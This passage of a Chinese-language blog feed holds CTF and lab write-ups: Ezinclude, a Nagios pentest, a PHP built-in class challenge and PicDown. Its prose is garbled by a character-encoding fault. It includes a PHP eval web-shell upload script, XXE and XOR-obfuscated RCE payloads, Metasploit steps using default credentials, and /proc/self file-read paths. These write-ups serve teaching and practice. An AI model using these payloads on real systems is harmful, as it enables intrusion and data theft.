class="line"></span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> HelloPhp();</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br></pre></td></tr></table></figure>

<h1 id="Ezinclude"><a href="#Ezinclude" class="headerlink" title="Ezinclude"></a>Ezinclude</h1><p><img src="image-20201030092624788.png" alt="image-20201030092624788"></p>
<p>ç¬¬ä¸€æ­¥ï¼Œè¿™é‡Œè¯´æ˜¯cookiesé‡Œé¢æœ‰ä¸€ä¸ªhashï¼Œæ˜¯hashæ‹“å±•æ”»å‡»ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> hashpumpy</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://ha1cyon-ctf.fun:30004/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>):</span><br><span class="line">    a,b=hashpumpy.hashpump(<span class="string">&#x27;a3dabbc779f2fbf8b6f56113ca78a7f9&#x27;</span>,<span class="string">&#x27;123444&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,i)</span><br><span class="line"></span><br><span class="line">    req=requests.get(url+<span class="string">&quot;name=&#123;&#125;&amp;pass=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(urllib.parse.quote(b),a))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;username/password error&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> req.text:</span><br><span class="line">        print(req.text,url+<span class="string">&quot;name=&#123;&#125;&amp;pass=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(urllib.parse.quote(b),a))</span><br><span class="line">        </span><br></pre></td></tr></table></figure>

<p>?ç„¶è€Œå®é™…åšçš„æ—¶å€™æŠŠcookiesçš„å€¼ä¸¢è¿›å»å½“ä½œpasswordçš„å°±è¿‡å»äº†ã€‚</p>
<p><img src="image-20201030092846076.png" alt="image-20201030092846076"></p>
<p>è¯»å–åˆ°ä¸‰ä¸ªphpæ–‡ä»¶ï¼š</p>
<p>flflflflag.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$file=$_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/data|input|zip/is&#x27;</span>,$file))&#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&#x27;nonono&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="keyword">include</span>($file);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;include($_GET[&quot;file&quot;])&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>index.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>;</span><br><span class="line">@$name=$_GET[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">@$pass=$_GET[<span class="string">&#x27;pass&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(md5($secret.$name)===$pass)&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;script language=&quot;javascript&quot; type=&quot;text/javascript&quot;&gt;</span></span><br><span class="line"><span class="string">           window.location.href=&quot;flflflflag.php&quot;;</span></span><br><span class="line"><span class="string">	&lt;/script&gt;</span></span><br><span class="line"><span class="string">&#x27;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	setcookie(<span class="string">&quot;Hash&quot;</span>,md5($secret.$name),time()+<span class="number">3600000</span>);</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;username/password error&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;!--md5($secret.$name)===$pass --&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>config.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$secret=<span class="string">&#x27;%^$&amp;$#fffdflag_is_not_here_ha_ha&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ç”¨dirbè¿˜èƒ½æ‰«å‡ºæ¥ä¸€ä¸ªdir.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">		<span class="keyword">array</span>(<span class="number">2</span>) &#123;</span><br><span class="line">		[<span class="number">0</span>]=&gt;</span><br><span class="line">		<span class="keyword">string</span>(<span class="number">1</span>) <span class="string">&quot;.&quot;</span></span><br><span class="line">		[<span class="number">1</span>]=&gt;</span><br><span class="line">		<span class="keyword">string</span>(<span class="number">2</span>) <span class="string">&quot;..&quot;</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">include</span>($_GET[<span class="string">&quot;file&quot;</span>])&lt;/body&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œä¼šåˆ—å‡ºtmpç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶ï¼Œ</p>
<p>é‚£çœ‹æ¥è¿˜æ˜¯è¦å†™ğŸè¿›å»å•Šï¼Œå¯æ˜¯ä¼ªåè®®è¢«è¿‡æ»¤äº†è¯¥æ€ä¹ˆå†™ğŸå‘¢ï¼Ÿ</p>
<p>å‚è€ƒæ–‡ç« ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.anquanke.com&#x2F;post&#x2F;id&#x2F;183046</span><br></pre></td></tr></table></figure>

<p>ä»è¿™ç¯‡æ–‡ç« ä¸­æˆ‘ä»¬å¯ä»¥çŸ¥é“ï¼Œå½“PHPé™·å…¥å´©æºƒçš„æ—¶å€™ä»–ä¼šè‡ªåŠ¨çš„é‡å¯ï¼Œæ¸…ç†æ‰è‡ªå·±çš„å†…å­˜ï¼Œä½†æ˜¯ä¸æ­¤åŒæ—¶è¿™å°±ä¼šå¯¼è‡´PHPä¼šåœæ­¢è‡ªå·±æ‰‹å¤´çš„å·¥ä½œï¼Œè¿™æ ·çš„è¯äºæ­¤åŒæ—¶æˆ‘ä»¬ç›´æ¥POSTä¸€æ®µæ•°æ®ï¼Œå°†ä¼šè¢«phpä¿å­˜è‡³tmpç›®å½•ä¸‹æ²¡æœ‰åœä¸‹ã€‚éšæœºç”Ÿæˆä¸€ä¸ªæ–‡ä»¶ï¼Œä½†æ˜¯åˆæ ¹æ®é¢˜ç›®çš„dir.phpï¼Œå¯ä»¥è®©æˆ‘ä»¬çœ‹è§tmpç›®å½•ä¸‹æœ‰ä»€ä¹ˆï¼Œæ‰€ä»¥ç›´æ¥åŒ…è£¹å³å¯~</p>
<p>æŠ„æ¥çš„expï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">payload = <span class="string">&quot;&lt;?php eval($_POST[a]);?&gt;&quot;</span></span><br><span class="line">file_data=&#123;</span><br><span class="line">   <span class="string">&#x27;file&#x27;</span>: BytesIO(payload.encode())</span><br><span class="line">&#125;</span><br><span class="line">url=<span class="string">&quot;http://a53738f6-1115-449b-b4af-167a2c1a5b1a.node3.buuoj.cn/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd&quot;</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">   r=requests.post(url=url,files=file_data,allow_redirects=<span class="literal">False</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">        print(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p>é‡ç‚¹å°±æ˜¯ç”¨string.strip_tagsè¿™ä¸€ç‚¹æ„é€ å‡ºphpçš„å†…å­˜æº¢å‡ºå³å¯å¾—åˆ°ã€‚ä¹‹åè®¿é—®dir.phpå¯ä»¥çœ‹è§æœ‰ä»€ä¹ˆæ–‡ä»¶æˆåŠŸä¸Šä¼ ï¼š</p>
<p><img src="image-20201031145743370.png" alt="image-20201031145743370"></p>
<p>è¿›è¡Œæ–‡ä»¶åŒ…å«å³å¯</p>
<p><img src="image-20201031150107473.png" alt="image-20201031150107473"></p>
<p>flagä¸€æ ·çš„PHP infoï¼ˆï¼‰å½“ä¸­</p>
]]></content>
  </entry>
  <entry>
    <title>Nagiosæ¸—é€</title>
    <url>/2020/11/08/Nagios%E6%B8%97%E9%80%8F/</url>
    <content><![CDATA[<h1 id="ç¬¬ä¸€æ­¥ï¼š"><a href="#ç¬¬ä¸€æ­¥ï¼š" class="headerlink" title="ç¬¬ä¸€æ­¥ï¼š"></a>ç¬¬ä¸€æ­¥ï¼š</h1><p>ç»å…¸NMAP</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">nmap -sS -v -T4 -Pn -A -p <span class="number">0</span>-<span class="number">65535</span> <span class="number">172</span>.<span class="number">192</span>.<span class="number">168</span>.<span class="number">235</span>.<span class="number">135</span></span><br></pre></td></tr></table></figure>

<p>drib</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">dirb http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">29</span>.<span class="number">128</span>/</span><br></pre></td></tr></table></figure>



<p>Nmapçš„ç»“æœå¦‚ä¸‹ï¼š</p>
<p><img src="image-20201108194244662.png" alt="image-20201108194244662"></p>
<p>è€Œdirbçš„ç»“æœï¼š</p>
<p><img src="image-20201108194339973.png" alt="image-20201108194339973"></p>
<p>æ„Ÿè§‰æœ‰ç‚¹é¸¡è‚‹å•Š..dirbçš„ç»“æœ</p>
<h1 id="ç¬¬äºŒæ­¥"><a href="#ç¬¬äºŒæ­¥" class="headerlink" title="ç¬¬äºŒæ­¥"></a>ç¬¬äºŒæ­¥</h1><p>WTMç›´æ¥ç”¨expåº“</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">searchsploit nagios</span><br></pre></td></tr></table></figure>



<p>msfconsole</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">search nagios</span><br></pre></td></tr></table></figure>

<p>ä¹‹åä½¿ç”¨show optionsæŸ¥çœ‹æˆ‘ä»¬éœ€è¦å¡«å†™ä»€ä¹ˆ</p>
<p>æŸ¥çœ‹è¿˜éœ€è¦è®¾ç½®çš„é€‰é¡¹ show optionsï¼Œä¸ºYESä¸”ç©ºçš„å°±æ˜¯è¿˜éœ€è¦æˆ‘ä»¬è®¾ç½®çš„ã€‚ å¯ä»¥çœ‹åˆ°ä¸‹å›¾ä¸­RHOSTå‚æ•°è¿˜æœªè®¾ç½®å†…å®¹</p>
<p><img src="1089831-20170102213249769-373635510.png" alt="img"></p>
<p>å‘ç°è¿™ä¸ªéœ€è¦è®¾ç½®å¯†ç ï¼Œäºæ˜¯å°è¯•æµ‹è¯•é»˜è®¤å¯†ç ç™»é™†NagiosXIï¼Œåœ¨è¯¥æ–‡ç« ä¸­å¾—åˆ°è´¦å·ä¸ºNagiosAdmin</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;ywnz.com&#x2F;linuxyffq&#x2F;6587.html</span><br></pre></td></tr></table></figure>

<p>å¯†ç ä¸ºadmin</p>
<p>è¿™é‡Œè®²ä¸€ä¸‹msfconsoleæ€ä¹ˆç”¨çš„..</p>
<h1 id="msfconsole"><a href="#msfconsole" class="headerlink" title="msfconsole"></a>msfconsole</h1><p>é¦–å…ˆsearch æ¼æ´</p>
<p>show options å¯ä»¥æŸ¥çœ‹æœ‰ä»€ä¹ˆæ¡ä»¶æˆ‘ä»¬è¿˜æ²¡æœ‰è®¾ç½®</p>
<p>å†ä¹‹åè®¾ç½®rhostå’Œlhostï¼Œå…¶ä¸­rhostä¸ºè¢«æ”»å‡»çš„æœºå­</p>
<p><strong>lhostä¸ºæ”»å‡»æœºï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬çš„kali</strong></p>
<p>ä¹‹åç›´æ¥runï¼Œå‘ç°å¤±è´¥</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">] Exploit aborted due to failure: no-access: Authentication failed. Please provide a valid username and password.</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>äºæ˜¯æŠŠæˆ‘ä»¬åˆšåˆšå¾—åˆ°çš„passwordå¡«å†™ä¸Šå»admin</p>
<p>å¾—åˆ°runä¹‹åæ‰§è¡Œshellï¼ŒwhoamiæŸ¥çœ‹æƒé™å°±æ˜¯rootäº†</p>
]]></content>
  </entry>
  <entry>
    <title>PHPçš„ä¸€ä¸ªå†…ç½®ç±»</title>
    <url>/2020/11/16/PHP%E7%9A%84%E4%B8%80%E4%B8%AA%E5%86%85%E7%BD%AE%E7%B1%BB/</url>
    <content><![CDATA[<p>æŸåº—é‡Œæ¯”èµ›é¢˜ç›®ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> $c = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$ra,$rb</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"><span class="comment">//        $c = $ra;</span></span><br><span class="line"><span class="comment">//        $c = $rb;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">b</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">c</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">d</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">e</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">g</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">h</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">i</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">j</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">k</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">l</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">m</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">n</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">o</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">p</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">q</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">r</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">s</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">t</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$rc=$_GET[<span class="string">&quot;rc&quot;</span>];</span><br><span class="line">$rb=$_GET[<span class="string">&quot;rb&quot;</span>];</span><br><span class="line">$ra=$_GET[<span class="string">&quot;ra&quot;</span>];</span><br><span class="line">$rd=$_GET[<span class="string">&quot;rd&quot;</span>];</span><br><span class="line">$method= <span class="keyword">new</span> $rc($ra, $rb);</span><br><span class="line">var_dump($method-&gt;$rd());</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬å¯ä»¥æ§åˆ¶å››ä¸ªå‚æ•°ï¼Œä½†æ˜¯æˆ‘ä»¬æ˜æ˜¾çŸ¥é“ï¼Œè¿™é‡Œçš„Userç±»å®Œå…¨æ²¡æœ‰æ„ä¹‰ï¼Œé¢˜ç›®ç»™å‡ºæç¤ºè®©æˆ‘ä»¬æƒ³æƒ³è¿˜æœ‰ä»€ä¹ˆç±»ï¼Œæƒ³äº†åŠå¤©åº”è¯¥æ˜¯å†…ç½®ç±»ï¼Œé˜Ÿé‡Œçš„w4nderå¸ˆå‚…ç›´æ¥ç»™æˆ‘expäº†ï¼ŒWTMç›´æ¥å¼€èˆ”</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?rc&#x3D;SimpleXMLElement&amp;ra&#x3D;&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [&lt;!ENTITY xxe SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;.&#x2F;index.php&quot;&gt;]&gt;&lt;x&gt;&amp;xxe;&lt;&#x2F;x&gt;&amp;rb&#x3D;2&amp;rd&#x3D;__toString</span><br></pre></td></tr></table></figure>

<p>æ— å­—æ¯RCEï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$_&#x3D;&quot;&#96;&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;&#x2F;&quot;;$&#123;$_&#125;[_]($&#123;$_&#125;[__]);  &#x2F;&#x2F;$_GET[_]($_GET[__])</span><br><span class="line">http:&#x2F;&#x2F;69.90.132.196:5003&#x2F;?warmup&#x3D;$_&#x3D;&quot;&#96;&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;&#x2F;&quot;;$&#123;$_&#125;[_]($&#123;$_&#125;[__]);&amp;_&#x3D;readfile&amp;__&#x3D;flag.php</span><br></pre></td></tr></table></figure>

<p>å¦å¤–è¿˜çœ‹åˆ°äº†ä¸€ç§è¯»æ–‡ä»¶çš„ payloadï¼Œæ”¶è—äº†</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$_=<span class="string">&quot;@:&gt;;963:&quot;</span>^<span class="string">&quot;2_______&quot;</span>; <span class="comment">// readfile</span></span><br><span class="line">$__=<span class="string">&quot;____&quot;</span>^<span class="string">&quot;830=&quot;</span>; <span class="comment">// glob</span></span><br><span class="line">$_($__(<span class="string">&#x27;*&#x27;</span>)[<span class="number">0</span>]); <span class="comment">// readfile(glob(&#x27;*&#x27;))</span></span><br></pre></td></tr></table></figure>]]></content>
  </entry>
  <entry>
    <title>PicDown</title>
    <url>/2020/12/16/PicDown/</url>
    <content><![CDATA[<h1 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h1><ol>
<li>æ–‡ä»¶åŒ…å«</li>
<li>linuxä¿¡æ¯æ–‡ä»¶è¯»å–</li>
</ol>
<h1 id="åšé¢˜æ€è·¯"><a href="#åšé¢˜æ€è·¯" class="headerlink" title="åšé¢˜æ€è·¯"></a>åšé¢˜æ€è·¯</h1><p>å¼€å±€å°±å¯ä»¥æ‰¾åˆ°ä¸€ä¸ªæ–‡ä»¶è¯»å–çš„åœ°æ–¹ï¼Œåˆ©ç”¨burpå°±å¯ä»¥æŠ“å–æ•°æ®</p>
<p><img src="image-20201216154655759.png" alt="image-20201216154655759"></p>
<p>ä¹‹åä½ å¯ä»¥ç›´æ¥è¯»å–åˆ°flagäº†[</p>
<p>æˆ‘æ„Ÿè§‰æœ‰ç‚¹å¥‡æ€ªï¼Œè¿™é“é¢˜åº”è¯¥æ²¡é‚£ä¹ˆç®€å•ï¼Œçœ‹äº†åˆ«äººçš„WPæ‰çŸ¥é“åº”è¯¥è¯»å–linuxprocä¸‹çš„æ–‡ä»¶ï¼Œè¿™é‡Œæ•´ç†ä¸€ä¸‹ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/proc/[pid]/cmdline  #æŸ¥çœ‹å½“å‰linuxæ­£åœ¨æ‰§è¡Œä»€ä¹ˆå‘½ä»¤ï¼Œåœ¨è¿™é‡Œpidä¸çŸ¥é“çš„æƒ…å†µä¸‹æˆ‘ä»¬å¯ä»¥é€šè¿‡selfä»£æŒ‡å½“å‰webç«¯çš„æ–‡ä»¶</span><br><span class="line"></span><br><span class="line">/proc/self/comm #æŸ¥çœ‹å½“å‰è¿›ç¨‹çš„å‘½ä»¤å</span><br><span class="line"></span><br><span class="line">/proc/self/cwd #æŸ¥çœ‹å½“å‰å·¥ä½œç›®å½•çš„ç¬¦å·è¿æ¥</span><br><span class="line">cwdä¸‹é¢ä¼šæœ‰å¯ä»¥è¯»å–çš„æ–‡ä»¶ï¼Œæ¯”å¦‚</span><br><span class="line">/var/www/html ä¸‹æˆ‘åœ¨å·¥ä½œï¼Œé‚£ä¹ˆ/proc/self/cwd/index.php åŒæ ·å¯ä»¥è¯»å–åˆ°</span><br><span class="line"></span><br><span class="line">/proc/self/environ #æ˜¾ç¤ºè¿›ç¨‹çš„ç¯å¢ƒå˜é‡</span><br><span class="line"></span><br><span class="line">/proc/self/exe #æŸ¥çœ‹å®é™…è¿è¡Œç¨‹åºçš„ç¬¦å·é“¾æ¥</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/proc/self/fd #ä¸€ä¸ªç›®å½•ï¼ŒåŒ…å«è¿›ç¨‹æ‰“å¼€æ–‡ä»¶çš„æƒ…å†µï¼ˆæ³¨æ„è¿™é‡Œæ›¾ç»å‡ºè¿‡è€ƒç‚¹ï¼Œå¦‚æœçœ‹åˆ°ä¸€ä¸ªç¨‹åºPythonæ‰“å¼€æŸä¸ªtxtä¹‹åæ²¡æœ‰å…³é—­ï¼Œå°±å¯ä»¥åˆ©ç”¨è¿™é‡Œæ¥è¯»å– </span><br></pre></td></tr></table></figure>



<p>æ—¢ç„¶æ˜¯flaskæ–‡ä»¶ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å°è¯•è¯»å–app.pyï¼Œè·å–æºç ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, Response</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">SECRET_FILE = <span class="string">&quot;/tmp/secret.txt&quot;</span></span><br><span class="line">f = <span class="built_in">open</span>(SECRET_FILE)</span><br><span class="line">SECRET_KEY = f.read().strip()</span><br><span class="line">os.remove(SECRET_FILE)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;search.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/page&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">page</span>():</span></span><br><span class="line">    url = request.args.get(<span class="string">&quot;url&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> url.lower().startswith(<span class="string">&quot;file&quot;</span>):</span><br><span class="line">            res = urllib.urlopen(url)</span><br><span class="line">            value = res.read()</span><br><span class="line">            response = Response(value, mimetype=<span class="string">&#x27;application/octet-stream&#x27;</span>)</span><br><span class="line">            response.headers[<span class="string">&#x27;Content-Disposition&#x27;</span>] = <span class="string">&#x27;attachment; filename=beautiful.jpg&#x27;</span></span><br><span class="line">            <span class="keyword">return</span> response</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            value = <span class="string">&quot;HACK ERROR!&quot;</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        value = <span class="string">&quot;SOMETHING WRONG!&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;search.html&#x27;</span>, res=value)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/no_one_know_the_manager&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">manager</span>():</span></span><br><span class="line">    key = request.args.get(<span class="string">&quot;key&quot;</span>)</span><br><span class="line">    print(SECRET_KEY)</span><br><span class="line">    <span class="keyword">if</span> key == SECRET_KEY:</span><br><span class="line">        shell = request.args.get(<span class="string">&quot;shell&quot;</span>)</span><br><span class="line">        os.system(shell)</span><br><span class="line">        res = <span class="string">&quot;ok&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        res = <span class="string">&quot;Wrong Key!&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8080</span>)</span><br></pre></td></tr></table></figure>



